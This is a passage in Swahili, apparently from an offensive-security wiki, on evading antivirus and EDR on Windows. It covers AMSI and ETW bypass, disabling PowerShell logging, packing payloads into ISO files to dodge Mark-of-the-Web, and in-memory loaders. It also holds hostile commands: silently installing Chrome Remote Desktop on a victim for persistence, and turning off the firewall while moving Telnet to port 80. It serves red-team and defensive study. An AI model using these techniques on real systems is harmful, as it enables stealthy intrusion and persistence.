Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa signature ya AMSI iliyotambuliwa kwenye memory ya process ya sasa. Zana hii hufanya kazi kwa kuchanganua memory ya process ya sasa ili kutafuta signature ya AMSI, kisha huiandika juu yake kwa maagizo ya NOP na kuiondoa kabisa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia toleo la 2 la Powershell**
Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zilizotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa madhumuni ya ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kukwepa kugunduliwa**.

Ili kukwepa PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Tumia Powershell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia kipindi cha unmanaged PowerShell**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuendesha PowerShell bila kuzindua `powershell.exe` (mbinu inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa controls zinazohusishwa mahususi na mchakato wa `powershell.exe`, lakini yenyewe haizimi AMSI, Script Block Logging, au kinga nyingine zote za PowerShell; kiwango cha ulinzi hutegemea runtime na utekelezaji wa host.


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation hutegemea kusimba data kwa njia fiche, jambo linaloongeza entropy ya binary na kurahisisha AVs na EDRs kuigundua. Kuwa mwangalifu na hili, na labda tumia usimbaji fiche kwenye sehemu maalum tu za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wakati wa kuchanganua malware inayotumia ConfuserEx 2 (au forks za kibiashara), ni jambo la kawaida kukumbana na tabaka kadhaa za ulinzi zinazozuia decompilers na sandboxes. Mchakato ulio hapa chini hurejesha kwa uhakika **IL iliyo karibu na ya awali**, ambayo baadaye inaweza kubadilishwa kuwa C# kwa kutumia tools kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserEx husimba kwa njia fiche kila *method body* na kuifungua ndani ya static constructor ya *module* (`<Module>.cctor`). Pia hubadilisha PE checksum ili mabadiliko yoyote yasababishe binary ku-crash. Tumia **AntiTamperKiller** kutafuta metadata tables zilizosimbwa kwa njia fiche, kurejesha XOR keys na kuandika upya assembly safi:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output ina vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambavyo vinaweza kuwa muhimu unapounda unpacker yako mwenyewe.

2.  Urejeshaji wa Symbol / control-flow – pitisha faili *safi* kwa **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – chagua profile ya ConfuserEx 2
     • de4dot itabatilisha control-flow flattening, itarejesha namespaces, classes na majina ya variables ya awali, na itasimbua strings za constants.

3.  Proxy-call stripping – ConfuserEx hubadilisha method calls za moja kwa moja kuwa wrappers nyepesi (zinazojulikana pia kama *proxy calls*) ili kuzuia zaidi decompilation. Ziondoe kwa **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Baada ya hatua hii, unapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya wrapper functions zisizoeleweka (`Class8.smethod_10`, …).

4.  Usafishaji wa mkono – endesha binary inayotokana nayo chini ya dnSpy, tafuta blobs kubwa za Base64 au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload *halisi*. Mara nyingi, malware huihifadhi kama byte array iliyosimbwa kwa TLV na kuanzishwa ndani ya `<Module>.byte_0`.

Mtiririko huu wa hatua hurejesha mtiririko wa utekelezaji **bila** kuhitaji kuendesha sample hasidi – ni muhimu unapofanya kazi kwenye workstation isiyo na muunganisho wa mtandao.

> 🛈  ConfuserEx hutengeneza custom attribute inayoitwa `ConfusedByAttribute`, ambayo inaweza kutumika kama IOC ili kufanya triage ya samples kiotomatiki.

#### Mstari mmoja
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya chanzo huria ya mkusanyiko wa LLVM inayoweza kutoa usalama zaidi wa programu kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia programu zisichezewe.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kutengeneza code iliyofichwa wakati wa compilation, bila kutumia zana za nje au kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza safu ya operations zilizofichwa zinazozalishwa na mfumo wa C++ template metaprogramming, na kufanya maisha ya mtu anayetaka kuvunja programu kuwa magumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina mbalimbali za faili za PE, zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa executables za aina yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni mfumo wa code obfuscation wenye udhibiti wa kina kwa lugha zinazoungwa mkono na LLVM, unaotumia ROP (return-oriented programming). ROPfuscator huficha programu katika kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, na hivyo kuzuia dhana yetu ya kawaida kuhusu mtiririko wa udhibiti.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzifungua

### Kujifunika kwa kila function kwa msaada wa LLVM compiler

Badala ya kuficha implant nzima wakati tu imelala, LLVM X86 backend iliyorekebishwa inaweza kuweka functions zilizochaguliwa zikiwa zimefichwa kwa XOR kila zinapokuwa hazitumiki. PoC ya Function Peekaboo huchagua majina yaliyotolewa kutoka kwa mangling yanayojumuisha `REG_`, huingiza stubs za kuingia/kutoka zisizotegemea nafasi kuzunguka machine code ya mwisho, na kutoa handler moja ya pamoja katika `.text`; signatures za kiwango cha source na Windows x64 calling convention hubaki bila kubadilika.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mabadiliko ya control-flow katika backend

Hii inapaswa kufanyika baada ya instruction selection na optimization kwa sababu mabadiliko haya lazima yajumuishe **kila return iliyotolewa** na yajue mpangilio kamili wa x86. `MachineFunctionPass` kabla ya utoaji hupata `MachineInstr::isReturn()` ya mwisho, huifuta ili njia ya mwisho iendelee hadi epilogue iliyoongezwa, na kubadilisha returns za awali kuwa `JMP_1 handler`. Acha teardown yoyote ya stack/frame iliyotengenezwa na compiler kabla ya kila return; elekeza upya instruction ya return pekee.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` na `emitFunctionBodyEnd()` hutoa stubs za kila function, huku `emitEndOfAsmFile()` ikitoa handler. Symbols zinazotumiwa pamoja kati ya hatua za utoaji huruhusu tawi la prologue kulenga epilogue yake inayofuata; kwa `je` ya karibu inayotolewa mwenyewe, andika `0F 84` ikifuatiwa na MC expression ya byte nne `target - address_after_je`. Calls na jumps kwenda kwa handler zinaweza badala yake kutolewa kama objects za `MCInst` (`CALL64pcrel32` na `JMP_1`). Pass lazima irudishe `false` kwa function ambayo haijachaguliwa ikiwa haikubadilisha chochote; PoC hurudisha `true` kimakosa katika hali hiyo.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata na uanzishaji kabla ya CRT

PoC huweka ufunguo wa XOR na records za byte 16 zilizo na pointer ya function iliyorekebishwa na loader pamoja na urefu wa runtime katika `.funcmeta`. Ingawa field ya C ni `uint32_t`, handler hufikia QWORD kwenye offset `+8` ya record, ikitumia urefu na padding yake, na husogeza records kwa `0x10`. Majina ya PE section yana urefu wa byte nane pekee, kwa hiyo utafutaji wa runtime huona `.funcmet`. Patcher ya nje huongeza `.stub` inayoweza kutekelezwa, huhifadhi RVA ya entry point ya awali kwenye stub, na kuelekeza upya `AddressOfEntryPoint`; PIC stub hupata image base kutoka `gs:[0x60]` → `[PEB+0x10]`, hupitia imports za PE32+ ili kutatua `VirtualProtect` ambayo tayari imeingizwa, na huendeshwa kabla ya CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Uanzishaji huweka sentinel katika `gs:[0xE8]` na kuita kila function ya metadata. Prologue yake inayosomeka daima huandika mwanzo wa function katika `gs:[0xF0]`, hugundua sentinel, na kuruka body ambayo bado haijafichwa. Kisha epilogue hutumia `call handler`; baada ya handler kuhifadhi registers 13 (`0x68` bytes), anwani ya kurudi katika `[rsp+0x68]` ndiyo mwisho wa function iliyobadilishwa, kwa hiyo `end - start` inaweza kuandikwa kwenye record yake ya metadata. Stub huondoa sentinel na kuruka hadi `ImageBase + original_entry_point_RVA` baada ya bodies zote kufichwa.<sup>[[38]](#references)[[39]](#references)</sup>

Wakati wa call ya kawaida, prologue huita handler huyo huyo ili kufunua body. Njia ya mwisho huendelea hadi epilogue iliyoongezwa, huku kila return ya awali ikiruka moja kwa moja hadi kwa handler ya pamoja. Epilogue ya kawaida pia hutumia `jmp handler` badala ya `call`, kwa hiyo baada ya kuficha tena, `ret` ya handler hutumia anwani ya awali ya kurudi ya caller na kuhifadhi matokeo ya function katika `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mbinu ya kuficha na viashiria vya uchanganuzi

Handler hupata record ya sasa, huruka prologue isiyofichwa yenye urefu usiobadilika (`0x46` bytes katika build hii), hubadilisha sehemu iliyobaki kuwa `PAGE_EXECUTE_READWRITE`, hufanya XOR byte kwa byte kwa kutumia byte ya chini ya key, kisha huiweka kuwa `PAGE_EXECUTE_READ`. Kwa hiyo loop hiyo hiyo hufunua code wakati wa kuingia na kuificha wakati wa kila kutoka kwa kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

Viashiria muhimu vya muundo huu ni pamoja na:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point ndani ya `.stub` inayoweza kutekelezwa na section ya `.funcmet` yenye key pamoja na pointers za `.text` zilizorekebishwa;
- uchanganuzi wa PEB, import-table, na section-table kabla ya CRT, ukifuatiwa na calls kupitia kila pointer ya metadata;
- PIC prologues zinazofanana za `call`/`pop` na return sites nyingi zinazoelekezwa upya kwa handler mmoja;
- writes kwenda `gs:[0xE8]`, `gs:[0xF0]`, na `gs:[0xF8]` zikifuatiwa na mabadiliko ya mara kwa mara ya `VirtualProtect` na writes za XOR za byte moja moja kwenye kurasa zinazoweza kutekelezwa zinazoungwa mkono na image.

Huu ni ukwepaji wa memory scanner, si ulinzi wa cryptographic: faili lililorekebishwa bado lina body ya awali isiyofichwa, na debugger inaweza kusimama kwenye `VirtualProtect` au loop ya XOR na kunasa function inayotumika. XOR ya byte moja, metadata inayosomeka, na mpaka usiobadilika wa `0x46` pia hurahisisha urejeshaji wa offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Slots za TEB za PoC ni za kila thread, lakini code pages zilizorekebishwa zinatumika kwa process nzima. Kwa hiyo kuingia kwa wakati mmoja au kwa kurudia kunaweza kubadilisha tena instructions wakati invocation nyingine inatekelezwa; exceptions na kutoka kwa njia zisizo za kawaida pia vinaweza kuruka hatua ya kuficha tena. Utekelezaji imara lazima usawazishe mabadiliko, urejeshe protection iliyorejeshwa kupitia `lpflOldProtect`, uepuke urefu wa stub uliowekwa moja kwa moja, ukague njia za `call` na `jmp` ili kuhakikisha stack alignment ya x64, na uite `FlushInstructionCache` baada ya kuandika upya bytes zinazoweza kutekelezwa. Microsoft inasema wazi kuwa caller anawajibika kuhakikisha instruction-cache coherence code inayoweza kutekelezwa inapobadilishwa.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unapopakua baadhi ya executables kutoka kwenye intaneti na kuzitekeleza.

Microsoft Defender SmartScreen ni utaratibu wa usalama unaolenga kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa hasidi.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hutumia hasa mbinu inayotegemea sifa, kumaanisha kuwa applications ambazo hazipakuliwi mara nyingi zitasababisha SmartScreen kuonyesha tahadhari na kumzuia mtumiaji wa mwisho kutekeleza faili (ingawa faili bado linaweza kutekelezwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) inayoitwa Zone.Identifier ambayo huundwa kiotomatiki wakati wa kupakua faili kutoka kwenye intaneti, pamoja na URL lililopakuliwa kutoka humo.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS ya faili lililopakuliwa kutoka kwenye intaneti.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kuwa executables zilizosainiwa kwa cheti cha kusaini kinachoaminika **hazitasababisha SmartScreen kuonyesha tahadhari**.

Njia yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes zisizo za **NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayopakia payloads ndani ya output containers ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hii hapa demo ya kukwepa SmartScreen kwa kufungasha payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mfumo madhubuti wa kuweka kumbukumbu kwenye Windows unaoruhusu programu na vipengele vya mfumo **kuweka kumbukumbu za matukio**. Hata hivyo, bidhaa za usalama pia zinaweza kuutumia kufuatilia na kugundua shughuli hasidi.

Kama vile AMSI inavyoweza kuzimwa (kukwepwa), inawezekana pia kufanya kazi ya **`EtwEventWrite`** ya process ya user space irudi mara moja bila kuweka kumbukumbu za matukio yoyote. Hili hufanywa kwa kuweka kiraka kwenye kazi hiyo iliyo kwenye memory ili irudi mara moja, na hivyo kuzima uwekaji wa kumbukumbu za ETW kwa process hiyo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia binaries za C# kwenye memory kumejulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutahitaji tu kuwa na wasiwasi kuhusu kuweka kiraka kwenye AMSI kwa process nzima.

Frameworks nyingi za C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari zina uwezo wa kutekeleza assemblies za C# moja kwa moja kwenye memory, lakini kuna njia mbalimbali za kufanya hivyo:

- **Fork\&Run**

Hii inahusisha **kuanzisha process mpya ya kutumika kama dhabihu**, kuingiza msimbo wako hasidi wa post-exploitation kwenye process hiyo mpya, kutekeleza msimbo wako hasidi na, ukimaliza, kuua process mpya. Njia hii ina faida na hasara zake. Faida ya mbinu ya fork and run ni kwamba utekelezaji hufanyika **nje ya** process yetu ya Beacon implant. Hii inamaanisha kuwa ikiwa jambo fulani katika kitendo chetu cha post-exploitation litaharibika au kugunduliwa, kuna **uwezekano mkubwa zaidi** wa **implant yetu kunusurika.** Hasara yake ni kwamba kuna **uwezekano mkubwa zaidi** wa kugunduliwa na **ugunduzi wa kitabia**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hii ni kuhusu kuingiza msimbo hasidi wa post-exploitation **ndani ya process yake yenyewe**. Kwa njia hii, unaweza kuepuka kuunda process mpya na kuichunguza kwa AV, lakini hasara yake ni kwamba ikiwa utekelezaji wa payload yako utapata tatizo, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa sababu inaweza ku-crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu kupakia C# Assembly, soma makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**; angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Upakiaji upya wa zana za .NET kwa NativeAOT WebAssembly (WasmForge)

Mbinu za kawaida za `execute-assembly` huhifadhi MSIL inayotambulika na hatimaye kuanzisha CLR. **WasmForge** hubadilisha msingi wa utekelezaji badala yake: huhamisha mradi wa C# kwenda kwenye lengo la majaribio la NativeAOT-LLVM WASI, huukompaili mapema kuwa WebAssembly, na kupachika moduli hiyo ndani ya host ya Windows PE inayotumia Wazero. Process inayotokana na hili haihitaji CLR, JIT, au host ya `dotnet` ya mashine lengwa, kwa hivyo kanuni zinazotegemea tu majina ya managed assemblies, upakiaji wa CLR, AMSI, au .NET ETW hupoteza mwonekano wa moja kwa moja. Hii ni mbinu ya kukwepa/ufungashaji, si kukwepa mpaka wa ruhusa—guest hubaki na ruhusa za zana asili na tabia yake inayoonekana ya mfumo wa uendeshaji.<sup>[[44]](#references)[[45]](#references)</sup>

### Kujenga mradi wa C#

Njia inayopendekezwa ya build ni kutumia mazingira ya Docker ya mradi kwa sababu inajumuisha .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker, na dependencies za kusaini. Faili ya `.csproj` hugunduliwa kiotomatiki; build ya hatua moja hufanya migration, patching ya uoanifu, compilation ya WASM, uundaji wa PE, na usaini.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Kwa utatuzi wa matatizo au ukaguzi wa msimbo uliotengenezwa, gawanya mchakato katika `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, na hatua ya mwisho `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Picha ya build pia hutumia wrapper ya `wasm-component-ld` ili kuepuka encoding ya component ya WASI Preview 2 na kutoa module ya kawaida inayotarajiwa na runtime iliyopachikwa.<sup>[[44]](#references)[[45]](#references)</sup>

### Kuunganisha wasm32 C# na x64 Win32

Huu si mkusanyiko upya unaofanya kazi bila mabadiliko. NativeAOT-WASI haina baadhi ya vipengele vya BCL vinavyolenga Windows au hubadilisha jinsi vinavyofanya kazi, na guest ya wasm32 kwa kawaida hutenga nafasi za pointer za baiti nne, ilhali API za x64 zinaweza kurudisha pointer za baiti nane. WasmForge hushughulikia matatizo haya mawili kwa kutumia tabaka zifuatazo zinazotengenezwa:<sup>[[44]](#references)</sup>

1. Patcher ya msimbo chanzo hurekebisha tofauti za kisemantiki mahususi kwa AOT na kuelekeza upya miito isiyotumika ya registry, pipes, WMI, identity, directory-service, file-version, LSA na mingine inayofanana, kwenda kwa wasaidizi wa `Wf*`.
2. Kichanganuzi cha P/Invoke hutoa mapping za NativeAOT `DirectPInvoke` ili miito ya `[DllImport]` iunganishwe na alama za C bridge zilizounganishwa badala ya kupakia DLL iliyotajwa kwa njia inayobadilika ndani ya guest.
3. Pointer zinazounganishwa na host hutumia `ulong` katika C# na `uint64_t` katika C. Dispatcher ya jumla hupeleka miito kwa handler ya Win32 ya host; `out8_mask` huashiria nafasi halisi za matokeo za baiti nane ambazo sehemu zake za juu lazima zihifadhiwe. Matokeo yasiyowekwa alama yenye umbo la wasm32 hutumia ulinzi wa snapshot/restore ili maandishi ya x64 yasiharibu baiti nne zilizo jirani.
4. Host bridges maalum hushughulikia operesheni zisizolingana na dispatch ya jumla ya syscall, kama vile ufikiaji wa cache ya tiketi za LSA, operesheni za Kerberos/BCrypt zenye matokeo yenye muundo, trafiki ya TCP KDC, na queries za LDAP.

Kwa mfano, wrapper ya `version.dll!VerQueryValueW` hupitisha anwani nne za host na kuweka bits 2 na 3 (`0xC`) kwa sababu pointer ya value na urefu wake ni nafasi za matokeo za baiti nane. Wrapper yenyewe hubaki ya jumla na hukabidhi jina la DLL, jina la export, arguments na mask kwa `wf_call_v2`; host hufanya tafsiri ya pointer na kuita API asilia.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Vikwazo na viashiria vya kubadilisha mwelekeo wa ugunduzi

Msimbo unaotumia reflection kwa kiwango kikubwa, upakiaji wa assembly unaobadilika, callbacks za native zisizo na mipaka, na miundo changamano ya x64 inayorejeshwa kwenye kumbukumbu ya WASM bado inaweza kuhitaji marekebisho mahususi kwa kila tool au kushindwa kabisa. Soketi za jumla za WASI Preview 2 pia zinaweza kufikia stub zisizofanya chochote, kwa hiyo tools zinazotumika hutumia host shims mahususi kwa kila protocol. Thibitisha kila command dhidi ya build ya native badala ya kudhani kuwa vipengele vyake vinalingana.<sup>[[44]](#references)[[45]](#references)</sup>

Mbinu hii huhamisha telemetry badala ya kufanya payload isionekane. Ugunduzi unaweza kuelekezwa kwenye PE iliyo na module ya WASM au inayoitengeneza wakati wa utekelezaji, tabia ya runtime inayofanana na Wazero, mgao na unakili usio wa kawaida wa kumbukumbu ya host/guest, utumaji wa jumla wa Win32 moja kwa moja, hitilafu za signing na rasilimali za PE, pamoja na API calls na trafiki ya mtandao inayotokana. Kwa hiyo, kutokuwepo kwa matukio ya CLR-load, AMSI, au .NET ETW hakupaswi kuchukuliwa kama ushahidi kwamba process ni salama.<sup>[[44]](#references)</sup>

## Kutumia Lugha Nyingine za Programu

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo hasidi kwa kutumia lugha nyingine kwa kuipa mashine iliyodukuliwa ufikiaji **wa mazingira ya interpreter yaliyosakinishwa kwenye SMB share inayodhibitiwa na Attacker**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira kwenye SMB share, unaweza **kutekeleza msimbo wowote ndani ya kumbukumbu** ya mashine iliyodukuliwa kwa kutumia lugha hizi.

Repo inaeleza: Defender bado huchanganua scripts, lakini kwa kutumia Go, Java, PHP n.k. tuna **unyumbufu zaidi wa kukwepa static signatures**. Majaribio ya scripts za reverse shell za nasibu zisizofichwa kwa obfuscation katika lugha hizi yamefanikiwa.

## Kuendesha tena WebAssembly ili kukwepa uchanganuzi tuli

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping hubadilisha access token ya bidhaa ya usalama kama vile EDR au AV. Kupunguza privileges za token kunaweza kuacha process ikiendelea kufanya kazi huku ikiizuia kutekeleza ukaguzi au hatua za kurekebisha zinazohitaji privileges.

Ili kuzuia hili, Windows inaweza **kuzuia michakato ya nje** kupata handles za tokens za michakato ya usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Programu Zinazoaminika

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**chapisho hili la blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kusakinisha Chrome Remote Desktop kwenye PC ya mwathiriwa, kisha kuitumia kuichukua na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Pakua kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha bofya faili ya MSI ya Windows ili kuipakua.
2. Endesha kisakinishi kimyakimya kwenye mashine ya mwathiriwa (unahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Kisha wizard itakuomba uidhinishe; bofya kitufe cha Authorize ili kuendelea.
4. Tekeleza command iliyotolewa baada ya kufanya marekebisho yanayohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameter ya `--pin` huweka PIN bila kutumia GUI).
 

## Ukwepaji wa Kina

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Ukwepaji ni mada changamano sana; wakati mwingine unapaswa kuzingatia vyanzo vingi tofauti vya telemetry kwenye mfumo mmoja, kwa hiyo ni vigumu kabisa kubaki bila kugunduliwa katika mazingira yaliyokomaa.

Kila mazingira unayolenga yatakuwa na uwezo na udhaifu wake.

Ninakuhimiza sana uangalie mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili upate msingi wa kuelewa mbinu za ukwepaji wa Kina zaidi.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Haya pia ni mazungumzo mengine mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu ukwepaji wa kina.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Zamani**

### **Angalia ni sehemu zipi Defender inaziona kuwa hasidi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), ambayo **huondoa sehemu za binary** hadi **igundue ni sehemu gani Defender** inaiona kuwa hasidi, kisha inakutenganishia sehemu hiyo.\
Tool nyingine inayofanya **jambo lilelile ni** [**avred**](https://github.com/dobin/avred), ambayo hutoa huduma hiyo kupitia tovuti ya wazi katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kusakinisha (kama administrator) kwa kutekeleza:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Ifanye ianze mfumo unapowashwa na uiendeshe sasa:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Badilisha port ya telnet** (stealth) na uzime firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (pakua faili za bin, si setup)

**KWENYE HOST**: Tekeleza _**winvnc.exe**_ na usanidi server:

